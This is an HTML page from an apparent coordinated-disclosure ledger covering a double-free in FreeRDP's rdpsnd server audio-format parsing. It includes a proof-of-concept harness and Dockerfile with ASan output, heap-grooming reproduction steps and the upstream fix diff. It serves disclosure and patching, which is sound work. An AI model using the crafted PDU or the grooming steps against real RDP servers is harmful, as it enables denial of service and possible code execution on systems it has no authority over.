@@ -1,0 +1,514 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-ZPF40VKS · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-ZPF40VKS · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  use-after-free
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-63652">CVE-2026-63652</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-9g22-w2gr-vcmp">GHSA-9g22-w2gr-vcmp</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-ZPF40VKS: Audio server double-free of client format list</h1>
+<p>In rdpsnd_server_recv_formats(), the server allocates context-&gt;client_formats and then parses each client audio format; if a format's cbSize exceeds remaining stream bytes, Stream_SafeSeek() fails and control jumps to out_free, which frees context-&gt;client_formats but leaves the pointer and num_client_formats intact. The dangling pointer persists through rdpsnd_server_stop()/reset, and when the session is torn down rdpsnd_server_context_free() (line ~1143) unconditionally frees it a second time. In the shadow server, rdpsnd-&gt;rdpcontext is never assigned so setChannelError is skipped and the main client loop keeps servicing other virtual channels after the first free, giving an authenticated attacker a grooming window to reclaim the chunk before triggering the second free on disconnect. The result is at minimum a reliable remote DoS (glibc double-free abort) and, with heap grooming, a heap-corruption primitive that may lead to code execution in the server.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>channels/rdpsnd/server/rdpsnd_main.c:263</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The out_free label at rdpsnd_main.c:263 calls free(context-&gt;client_formats) without setting the pointer to NULL or clearing num_client_formats; nothing else on the error/stop/reset path clears it either. Because rdpsnd_server_context_free() at line ~1143 unconditionally calls free(context-&gt;client_formats) during teardown (reached from shadow_client.c:2932, sfreerdp.c:105, mf_peer.c:231, wf_peer.c:84), the same pointer is freed twice. The attacker controls both the size of the allocation (via wNumberOfFormats) and the timing between the two frees (via disconnect), enabling allocator-metadata corruption.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Authenticate to the FreeRDP shadow/proxy/sample server and join the RDPSND channel</li>
+<li>In response to the server's SNDC_FORMATS, send a Client Audio Formats PDU where one format's cbSize (e.g. 0xFFFF) exceeds remaining stream bytes</li>
+<li>Stream_SafeSeek() fails; out_free frees context-&gt;client_formats (size wNumberOfFormats * sizeof(AUDIO_FORMAT)) without NULLing it</li>
+<li>Send crafted PDUs on another virtual channel sized to reclaim the freed chunk with attacker-controlled data</li>
+<li>Disconnect; session teardown calls rdpsnd_server_context_free(), which frees the reclaimed chunk a second time</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>On the out_free error path, set context-&gt;client_formats = NULL and context-&gt;num_client_formats = 0 immediately after freeing so that later cleanup cannot free the pointer again.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-ZPF40VKS.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-ZPF40VKS<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Summary</h2>
+<p>The FreeRDP audio-output <strong>server</strong> channel (<code>rdpsnd</code>, server side) parses the
+client-advertised audio-format list in <code>rdpsnd_server_recv_formats()</code>
+(<code>channels/rdpsnd/server/rdpsnd_main.c</code>). It allocates <code>context-&gt;client_formats</code>
+up front and then validates each format record. On <strong>any</strong> per-record validation
+failure the function jumps to the <code>out_free:</code> label, which calls
+<code>free(context-&gt;client_formats)</code> <strong>without clearing <code>context-&gt;client_formats</code></strong>
+(and without resetting <code>context-&gt;num_client_formats</code>). The dangling pointer
+survives channel stop/reset, and at session teardown
+<code>rdpsnd_server_context_free()</code> unconditionally calls
+<code>free(context-&gt;client_formats)</code> a <strong>second time</strong> — an attacker-influenced
+double-free (CWE-415).</p>
+<p>An authenticated remote RDP client triggers this with a single crafted PDU over
+the standard static <code>rdpsnd</code> virtual channel: no server-side user interaction,
+and audio redirection is a default-expected RDP feature present in FreeRDP-based
+servers (shadow server, proxy, <code>sfreerdp</code>). The attacker controls the freed
+chunk's size (<code>wNumberOfFormats</code>) and the timing of the second free (via
+disconnect), so beyond a guaranteed remote DoS this is a size-controlled
+double-free / heap-corruption primitive.</p>
+<h2>Affected versions</h2>
+<ul>
+<li><strong>FreeRDP 3.x</strong> — present in released tags <strong>3.22.0, 3.26.0, 3.27.1</strong> and on
+  <strong><code>master</code></strong> (HEAD <code>1f7a716d39b5605bb8a83b0c3c97a6ce386609ef</code>, reproduced
+  2026-07-01). Unpatched. On master the first free is at
+  <code>channels/rdpsnd/server/rdpsnd_main.c:304</code> (<code>out_free</code>) and the second at
+  <code>:1194</code> (<code>rdpsnd_server_context_free</code>); in 3.27.1 the same two frees are at
+  <code>:275</code> and <code>:1155</code>. Because the bug is in released 3.x tags (not
+  development-branch-only), it qualifies for a CVE per the project's
+  supported-versions policy.</li>
+<li>Requires the server build to include the <code>rdpsnd</code> server channel (standard).</li>
+</ul>
+<h2>Details</h2>
+<h3>Vulnerable code</h3>
+<p><code>channels/rdpsnd/server/rdpsnd_main.c</code>, <code>rdpsnd_server_recv_formats()</code>:</p>
+<pre tabindex="0"><code class="language-c">context-&gt;client_formats = audio_formats_new(context-&gt;num_client_formats);   // :217 calloc(N, sizeof(AUDIO_FORMAT))
+...
+for (UINT16 i = 0; i &lt; context-&gt;num_client_formats; i++)
+{
+    AUDIO_FORMAT* format = &amp;context-&gt;client_formats[i];
+
+    if (!Stream_CheckAndLogRequiredLength(TAG, s, 18))
+        goto out_free;                                                      // (a) short record
+
+    Stream_Read_UINT16(s, format-&gt;wFormatTag);
+    Stream_Read_UINT16(s, format-&gt;nChannels);
+    ...
+    Stream_Read_UINT16(s, format-&gt;nBlockAlign);
+    ...
+    Stream_Read_UINT16(s, format-&gt;cbSize);
+
+    if ((format-&gt;nChannels == 0) || (format-&gt;nBlockAlign == 0))
+        goto out_free;                                                      // (b) zero divisor
+
+    ... /* ADPCM nBlockAlign sanity checks */ ...
+
+    if (format-&gt;cbSize &gt; 0)
+    {
+        if (!Stream_SafeSeek(s, format-&gt;cbSize))                            // :287
+        {
+            WLog_ERR(TAG, &quot;Stream_SafeSeek failed!&quot;);
+            goto out_free;                                                  // (c) cbSize &gt; remaining
+        }
+    }
+}
+...
+out_free:                                                                   // :303
+    free(context-&gt;client_formats);                                         // :304  frees, but pointer NOT cleared
+    return error;
+</code></pre>
+<p><code>audio_formats_new(count)</code> is <code>calloc(count, sizeof(AUDIO_FORMAT))</code> — one heap
+block — so <code>context-&gt;client_formats</code> points at a single allocation.</p>
+<p>At teardown, <code>rdpsnd_server_context_free()</code> frees the same field again:</p>
+<pre tabindex="0"><code class="language-c">// channels/rdpsnd/server/rdpsnd_main.c — rdpsnd_server_context_free() (:1175)
+    free(context-&gt;server_formats);
+    free(context-&gt;client_formats);   // :1194  SECOND free of the dangling pointer
+    free(context-&gt;priv);
+    free(context);
+</code></pre>
+<p>The overflow trigger used by the PoC is the <code>cbSize</code> path (c): a format record
+declaring <code>cbSize = 0xFFFF</code> with no trailing bytes makes
+<code>Stream_SafeSeek(s, 0xFFFF)</code> fail, so the first (already-parsed) record sends
+control to <code>out_free</code> after the array is allocated. Paths (a) and (b) reach the
+same free.</p>
+<h3>Root cause</h3>
+<p>The error path frees a buffer still owned by <code>context-&gt;client_formats</code> without
+nulling the owning field, breaking the single-owner invariant that
+<code>rdpsnd_server_context_free()</code> relies on.</p>
+<h3>Server-independent call path (from the channel dispatcher)</h3>
+<pre tabindex="0"><code>rdpsnd_server_thread                                     rdpsnd_main.c:308
+  rdpsnd_server_handle_messages                          rdpsnd_main.c:1221
+    (read priv-&gt;msgType)                                 rdpsnd_main.c:1256
+    switch (priv-&gt;msgType)                               rdpsnd_main.c:1281
+      case SNDC_FORMATS:                                 rdpsnd_main.c:1291
+        rdpsnd_server_recv_formats(context, s)           rdpsnd_main.c:1292
+          free(context-&gt;client_formats)                  rdpsnd_main.c:304    &lt;-- FIRST free (out_free)
+  ...session teardown...
+  rdpsnd_server_context_free(context)                    rdpsnd_main.c:1175
+    free(context-&gt;client_formats)                        rdpsnd_main.c:1194   &lt;-- SECOND free
+</code></pre>
+<p><code>SNDC_FORMATS</code> is dispatched to <code>rdpsnd_server_recv_formats</code> unconditionally for
+that message type, so any authenticated client that has joined the <code>rdpsnd</code>
+static channel reaches the vulnerable function.</p>
+<h2>Impact</h2>
+<p>A single malformed <em>Client Audio Formats</em> PDU frees a server heap chunk whose
+size the attacker selects (via <code>wNumberOfFormats</code>); the same pointer is freed a
+second time at session teardown. The immediately demonstrated, reliable impact
+is a <strong>remote denial of service</strong> — modern glibc detects the double <code>free()</code> and
+<code>abort()</code>s the server process (ASan reproduces it deterministically below).
+Because the attacker controls the allocation size and the second-free timing,
+and can drive arbitrary additional channel traffic between the two frees to
+recycle the chunk, this is a genuine heap-corruption primitive; escalation to
+code execution is opportunistic and allocator-hardening-dependent, and is not
+demonstrated here. No server-side user interaction; requires a completed RDP
+handshake (post-auth) → <strong>High</strong>.</p>
+<h2>Proof of Concept</h2>
+<p>Self-contained Docker reproducer. It builds <code>libfreerdp</code> + <code>winpr</code> + the
+<code>rdpsnd</code> server channel under AddressSanitizer at the affected commit, and a
+small consumer that <code>#include</code>s the <strong>real upstream translation unit</strong>
+(<code>channels/rdpsnd/server/rdpsnd_main.c</code>) so the frames carry the true upstream
+source paths. It drives the genuine static <code>rdpsnd_server_recv_formats()</code> with a
+crafted Client Audio Formats PDU body (exactly the bytes the dispatcher hands to
+that function after stripping the SNDPROLOG), then calls the exported
+<code>rdpsnd_server_context_free()</code> — i.e. the identical first-free / second-free pair
+an authenticated client drives over the <code>rdpsnd</code> channel followed by session
+teardown. (Standing up a full TLS/NLA RDP session plus a custom client that
+emits the malformed PDU reaches the same two frames; the dispatcher wiring above
+establishes that reachability.)</p>
+<p><strong><code>harness.c</code></strong></p>
+<pre tabindex="0"><code class="language-c">/*
+ * FreeRDP rdpsnd server double-free of client_formats (CWE-415).
+ * Drives the real static rdpsnd_server_recv_formats() (hits out_free -&gt;
+ * free(client_formats) without NULLing) then the exported
+ * rdpsnd_server_context_free() (second free) =&gt; double free.
+ */
+#include &quot;rdpsnd_main.c&quot;   /* the real upstream TU: static recv_formats + context_free */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+static void w16(BYTE* p, UINT16 v) { p[0] = (BYTE)(v &amp; 0xff); p[1] = (BYTE)((v &gt;&gt; 8) &amp; 0xff); }
+static void w32(BYTE* p, UINT32 v) { p[0] = (BYTE)v; p[1] = (BYTE)(v &gt;&gt; 8); p[2] = (BYTE)(v &gt;&gt; 16); p[3] = (BYTE)(v &gt;&gt; 24); }
+
+int main(void)
+{
+    /* A Client Audio Formats PDU body (bytes after the 4-byte SNDPROLOG the
+     * dispatcher has already stripped before calling recv_formats). */
+    BYTE buf[38];
+    memset(buf, 0, sizeof(buf));
+
+    /* --- 20-byte fixed header --- */
+    w32(buf + 0,  0);        /* dwFlags            */
+    w32(buf + 4,  0);        /* dwVolume           */
+    w32(buf + 8,  0);        /* dwPitch            */
+    w16(buf + 12, 0);        /* wDGramPort         */
+    w16(buf + 14, 1);        /* wNumberOfFormats = 1 -&gt; one AUDIO_FORMAT allocated */
+    buf[16] = 0;             /* cLastBlockConfirmed */
+    w16(buf + 17, 0);        /* wVersion           */
+    buf[19] = 0;             /* bPad               */
+
+    /* --- one 18-byte WAVEFORMATEX-ish record --- */
+    w16(buf + 20, 1);        /* wFormatTag = WAVE_FORMAT_PCM */
+    w16(buf + 22, 2);        /* nChannels   (non-zero, passes the div-by-zero gate) */
+    w32(buf + 24, 44100);    /* nSamplesPerSec   */
+    w32(buf + 28, 0);        /* nAvgBytesPerSec  */
+    w16(buf + 32, 4);        /* nBlockAlign (non-zero) */
+    w16(buf + 34, 16);       /* wBitsPerSample   */
+    w16(buf + 36, 0xFFFF);   /* cbSize = 65535 -&gt; exceeds remaining bytes (0) -&gt; Stream_SafeSeek fails */
+
+    RdpsndServerContext* context = (RdpsndServerContext*)calloc(1, sizeof(RdpsndServerContext));
+    if (!context) { fprintf(stderr, &quot;calloc context failed\n&quot;); return 2; }
+
+    wStream* s = Stream_New(buf, sizeof(buf));
+    if (!s) { fprintf(stderr, &quot;Stream_New failed\n&quot;); return 2; }
+
+    fprintf(stderr, &quot;[harness] calling rdpsnd_server_recv_formats (will hit out_free)\n&quot;);
+    UINT rc = rdpsnd_server_recv_formats(context, s);
+    fprintf(stderr, &quot;[harness] recv_formats returned 0x%08x; client_formats=%p (DANGLING, not NULLed)\n&quot;,
+            rc, (void*)context-&gt;client_formats);
+
+    Stream_Free(s, FALSE);
+
+    fprintf(stderr, &quot;[harness] calling rdpsnd_server_context_free (second free -&gt; double-free)\n&quot;);
+    rdpsnd_server_context_free(context);
+
+    fprintf(stderr, &quot;[harness] survived (NO double-free -- likely a fixed build)\n&quot;);
+    return 0;
+}
+</code></pre>
+<p><strong><code>Dockerfile</code></strong></p>
+<pre tabindex="0"><code class="language-dockerfile">FROM ubuntu:24.04
+ENV DEBIAN_FRONTEND=noninteractive
+ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
+ARG CLANG_VERSION=20
+
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+        ca-certificates git make cmake ninja-build pkg-config libc6-dev \
+        zlib1g-dev libssl-dev \
+        wget gnupg lsb-release software-properties-common \
+    &amp;&amp; wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh &amp;&amp; chmod +x /tmp/llvm.sh &amp;&amp; /tmp/llvm.sh ${CLANG_VERSION} \
+    &amp;&amp; apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+
+ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
+ENV ASAN_FLAGS=&quot;-g -fno-omit-frame-pointer -O1 -fsanitize=address&quot;
+
+RUN git clone https://github.com/FreeRDP/FreeRDP /src/repo
+WORKDIR /src/repo
+RUN git checkout ${TARGET_COMMIT}
+
+RUN cmake -G Ninja -S /src/repo -B /build \
+        -DCMAKE_BUILD_TYPE=Debug \
+        -DCMAKE_C_COMPILER=clang-${CLANG_VERSION} \
+        -DCMAKE_C_FLAGS=&quot;${ASAN_FLAGS}&quot; \
+        -DCMAKE_EXE_LINKER_FLAGS=&quot;-fsanitize=address&quot; \
+        -DCMAKE_SHARED_LINKER_FLAGS=&quot;-fsanitize=address&quot; \
+        -DCMAKE_INTERPROCEDURAL_OPTIMIZATION=OFF \
+        -DBUILD_SHARED_LIBS=ON \
+        -DWITH_SERVER=ON -DWITH_CLIENT=OFF -DWITH_SAMPLE=OFF \
+        -DWITH_SHADOW=OFF -DWITH_PROXY=OFF -DWITH_CLIENT_SDL=OFF \
+        -DWITH_X11=OFF -DWITH_WAYLAND=OFF -DWITH_PCSC=OFF \
+        -DWITH_SWSCALE=OFF -DWITH_FFMPEG=OFF -DWITH_OPUS=OFF \
+        -DWITH_FUSE=OFF -DWITH_CUPS=OFF -DWITH_KRB5=OFF \
+        -DCHANNEL_URBDRC=OFF -DWITH_LIBUSB=OFF \
+        -DWITH_MANPAGES=OFF -DWITH_GSSAPI=OFF \
+        -DUSE_VERSION_FROM_GIT_TAG=OFF \
+    &amp;&amp; cmake --build /build --target rdpsnd-server freerdp-server freerdp winpr
+
+COPY harness.c /tmp/harness.c
+RUN set -e ; \
+    FRDP_SERVER=$(find /build -name 'libfreerdp-server*.so' | head -1) ; \
+    FRDP=$(find /build -name 'libfreerdp3.so' -o -name 'libfreerdp.so' | head -1) ; \
+    WINPR=$(find /build -name 'libwinpr3.so' -o -name 'libwinpr.so' | head -1) ; \
+    RPATHS=$(find /build -name 'lib*.so' -exec dirname {} \; | sort -u | sed 's/^/-Wl,-rpath,/' | tr '\n' ' ') ; \
+    $CC $ASAN_FLAGS \
+        -I/src/repo/channels/rdpsnd/server \
+        -I/src/repo/channels/rdpsnd/common \
+        -I/src/repo/include -I/build/include \
+        -I/build/winpr/include -I/src/repo/winpr/include \
+        -I/src/repo/libfreerdp \
+        /tmp/harness.c $RPATHS &quot;$FRDP_SERVER&quot; &quot;$FRDP&quot; &quot;$WINPR&quot; \
+        -o /tmp/poc_run -fsanitize=address \
+    &amp;&amp; echo BUILD_OK
+
+ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
+ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer
+CMD [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;/tmp/poc_run 2&gt;&amp;1; echo EXIT=$?&quot;]
+</code></pre>
+<p>Build and run:</p>
+<pre tabindex="0"><code class="language-sh">docker build -t frdp-rdpsnd-df .
+docker run --rm frdp-rdpsnd-df
+</code></pre>
+<p><strong>Observed output at master <code>1f7a716d</code> (AddressSanitizer):</strong></p>
+<pre tabindex="0"><code>[harness] calling rdpsnd_server_recv_formats (will hit out_free)
+[ERROR][com.freerdp.channels.rdpsnd.server] - [rdpsnd_server_recv_formats]: Stream_SafeSeek failed!
+[harness] recv_formats returned 0x0000054f; client_formats=0x7b390ebe0040 (DANGLING, not NULLed)
+[harness] calling rdpsnd_server_context_free (second free -&gt; double-free)
+=================================================================
+==7==ERROR: AddressSanitizer: attempting double-free on 0x7b390ebe0040 in thread T0:
+    #0 ... in free
+    #1 ... in rdpsnd_server_context_free /src/repo/channels/rdpsnd/server/rdpsnd_main.c:1194:2
+    #2 ... in main /tmp/harness.c:71:2
+
+0x7b390ebe0040 is located 0 bytes inside of 32-byte region [0x7b390ebe0040,0x7b390ebe0060)
+freed by thread T0 here:
+    #0 ... in free
+    #1 ... in rdpsnd_server_recv_formats /src/repo/channels/rdpsnd/server/rdpsnd_main.c:304:2   (out_free)
+
+previously allocated by thread T0 here:
+    #0 ... in calloc
+    #1 ... in rdpsnd_server_recv_formats /src/repo/channels/rdpsnd/server/rdpsnd_main.c:217:28  (audio_formats_new)
+
+SUMMARY: AddressSanitizer: double-free /src/repo/channels/rdpsnd/server/rdpsnd_main.c:1194:2 in rdpsnd_server_context_free
+==7==ABORTING
+EXIT=134
+</code></pre>
+<h2>Suggested fix</h2>
+<p>Clear the pointer (and the count) on the error path so the later
+<code>free(context-&gt;client_formats)</code> in <code>rdpsnd_server_context_free()</code> becomes a
+<code>free(NULL)</code> no-op:</p>
+<pre tabindex="0"><code class="language-diff"> out_free:
+    free(context-&gt;client_formats);
++   context-&gt;client_formats = NULL;
++   context-&gt;num_client_formats = 0;
+    return error;
+</code></pre>
+<p><strong>Fix-verified:</strong> with this change the same PoC prints <code>client_formats=(nil)</code> and
+exits <code>0</code> with no ASan report. (Defense-in-depth: <code>rdpsnd_server_context_free()</code>
+could also NULL the field after freeing, but the root fix belongs on the error
+path.)</p>
+<h2>References</h2>
+<ul>
+<li><code>channels/rdpsnd/server/rdpsnd_main.c</code> — <code>rdpsnd_server_recv_formats()</code>
+  (alloc at :217; <code>out_free</code> <code>free(client_formats)</code> at :304),
+  <code>rdpsnd_server_context_free()</code> (second free at :1194); dispatcher
+  <code>rdpsnd_server_handle_messages()</code> (:1221, <code>case SNDC_FORMATS:</code> :1291).</li>
+<li>Distinct sibling fixes (FreeRDP 3.22.0, different functions):
+  <code>audin_server_recv_formats</code> over-free; <code>rdpsnd_treat_wave</code> async use-after-free.</li>
+<li>CWE-415 (Double Free).</li>
+</ul>
+<h2>Attribution</h2>
+<p>please credit <strong>Claude</strong> and <strong>Ada Logics</strong> — found by Anthropic using agents
+to study the security of open-source projects, with Ada Logics validating and reporting.</p>
+<h2>Disclosure</h2>
+<p>This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/channels/rdpsnd/server/rdpsnd_main.c b/channels/rdpsnd/server/rdpsnd_main.c</span>
+<span class="diff-h">index 3d0052e828f2..9955932310f6 100644</span>
+<span class="diff-h">--- a/channels/rdpsnd/server/rdpsnd_main.c</span>
+<span class="diff-h">+++ b/channels/rdpsnd/server/rdpsnd_main.c</span>
+<span class="diff-h">@@ -181,6 +181,14 @@ static UINT rdpsnd_server_recv_quality_mode(RdpsndServerContext* context, wStrea</span>
+<span class="diff-c"> 	return CHANNEL_RC_OK;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+static void rdpsnd_server_client_format_free(RdpsndServerContext* context)</span>
+<span class="diff-a">+{</span>
+<span class="diff-a">+	WINPR_ASSERT(context);</span>
+<span class="diff-a">+	free(context-&gt;client_formats);</span>
+<span class="diff-a">+	context-&gt;client_formats = nullptr;</span>
+<span class="diff-a">+	context-&gt;num_client_formats = 0;</span>
+<span class="diff-a">+}</span>
+<span class="diff-a">+</span>
+<span class="diff-c"> /**</span>
+<span class="diff-c">  * Read Client Audio Formats and Version PDU (2.2.2.2)</span>
+<span class="diff-c">  *</span>
+<span class="diff-h">@@ -301,7 +309,7 @@ static UINT rdpsnd_server_recv_formats(RdpsndServerContext* context, wStream* s)</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	return CHANNEL_RC_OK;</span>
+<span class="diff-c"> out_free:</span>
+<span class="diff-d">-	free(context-&gt;client_formats);</span>
+<span class="diff-a">+	rdpsnd_server_client_format_free(context);</span>
+<span class="diff-c"> 	return error;</span>
+<span class="diff-c"> }</span>
+<span class="diff-c"> </span>
+<span class="diff-h">@@ -1191,7 +1199,7 @@ void rdpsnd_server_context_free(RdpsndServerContext* context)</span>
+<span class="diff-c"> 	}</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	free(context-&gt;server_formats);</span>
+<span class="diff-d">-	free(context-&gt;client_formats);</span>
+<span class="diff-a">+	rdpsnd_server_client_format_free(context);</span>
+<span class="diff-c"> 	free(context-&gt;priv);</span>
+<span class="diff-c"> 	free(context);</span>
+<span class="diff-c"> }</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/FreeRDP/FreeRDP/commit/caf653c0ba1c75ec8f298d1baa59770102a5d14c" rel="noopener noreferrer">https://github.com/FreeRDP/FreeRDP/commit/caf653c0ba1c75ec8f298d1baa59770102a5d14c</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-02</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-06</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-09-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">7d3085a90155c6cf9d8c963b5da4bf757e3f9c07044f326ccd172b54cd6e420d1808fe44d41917ddf06e8d1d03e33b1b174eb8afb9396c3dc416b4740ed194f8</p>
+<p class="kicker">Committed 2026-07-22 07:29 UTC</p>
+<p class="kicker">Revealed 2026-09-28 21:43 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-ZPF40VKS-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-ZPF40VKS%22%2C%22bug_class%22%3A%22Double%20Free%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A39%2B00%3A00%22%2C%22description%22%3A%22In%20rdpsnd_server_recv_formats%28%29%2C%20the%20server%20allocates%20context-%3Eclient_formats%20and%20then%20parses%20each%20client%20audio%20format%3B%20if%20a%20format%27s%20cbSize%20exceeds%20remaining%20stream%20bytes%2C%20Stream_SafeSeek%28%29%20fails%20and%20control%20jumps%20to%20out_free%2C%20which%20frees%20context-%3Eclient_formats%20but%20leaves%20the%20pointer%20and%20num_client_formats%20intact.%20The%20dangling%20pointer%20persists%20through%20rdpsnd_server_stop%28%29/reset%2C%20and%20when%20the%20session%20is%20torn%20down%20rdpsnd_server_context_free%28%29%20%28line%20~1143%29%20unconditionally%20frees%20it%20a%20second%20time.%20In%20the%20shadow%20server%2C%20rdpsnd-%3Erdpcontext%20is%20never%20assigned%20so%20setChannelError%20is%20skipped%20and%20the%20main%20client%20loop%20keeps%20servicing%20other%20virtual%20channels%20after%20the%20first%20free%2C%20giving%20an%20authenticated%20attacker%20a%20grooming%20window%20to%20reclaim%20the%20chunk%20before%20triggering%20the%20second%20free%20on%20disconnect.%20The%20result%20is%20at%20minimum%20a%20reliable%20remote%20DoS%20%28glibc%20double-free%20abort%29%20and%2C%20with%20heap%20grooming%2C%20a%20heap-corruption%20primitive%20that%20may%20lead%20to%20code%20execution%20in%20the%20server.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22channels/rdpsnd/server/rdpsnd_main.c%3A263%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Authenticate%20to%20the%20FreeRDP%20shadow/proxy/sample%20server%20and%20join%20the%20RDPSND%20channel%22%2C%222.%20In%20response%20to%20the%20server%27s%20SNDC_FORMATS%2C%20send%20a%20Client%20Audio%20Formats%20PDU%20where%20one%20format%27s%20cbSize%20%28e.g.%200xFFFF%29%20exceeds%20remaining%20stream%20bytes%22%2C%223.%20Stream_SafeSeek%28%29%20fails%3B%20out_free%20frees%20context-%3Eclient_formats%20%28size%20wNumberOfFormats%20%2A%20sizeof%28AUDIO_FORMAT%29%29%20without%20NULLing%20it%22%2C%224.%20Send%20crafted%20PDUs%20on%20another%20virtual%20channel%20sized%20to%20reclaim%20the%20freed%20chunk%20with%20attacker-controlled%20data%22%2C%225.%20Disconnect%3B%20session%20teardown%20calls%20rdpsnd_server_context_free%28%29%2C%20which%20frees%20the%20reclaimed%20chunk%20a%20second%20time%22%5D%2C%22technical_details%22%3A%22The%20out_free%20label%20at%20rdpsnd_main.c%3A263%20calls%20free%28context-%3Eclient_formats%29%20without%20setting%20the%20pointer%20to%20NULL%20or%20clearing%20num_client_formats%3B%20nothing%20else%20on%20the%20error/stop/reset%20path%20clears%20it%20either.%20Because%20rdpsnd_server_context_free%28%29%20at%20line%20~1143%20unconditionally%20calls%20free%28context-%3Eclient_formats%29%20during%20teardown%20%28reached%20from%20shadow_client.c%3A2932%2C%20sf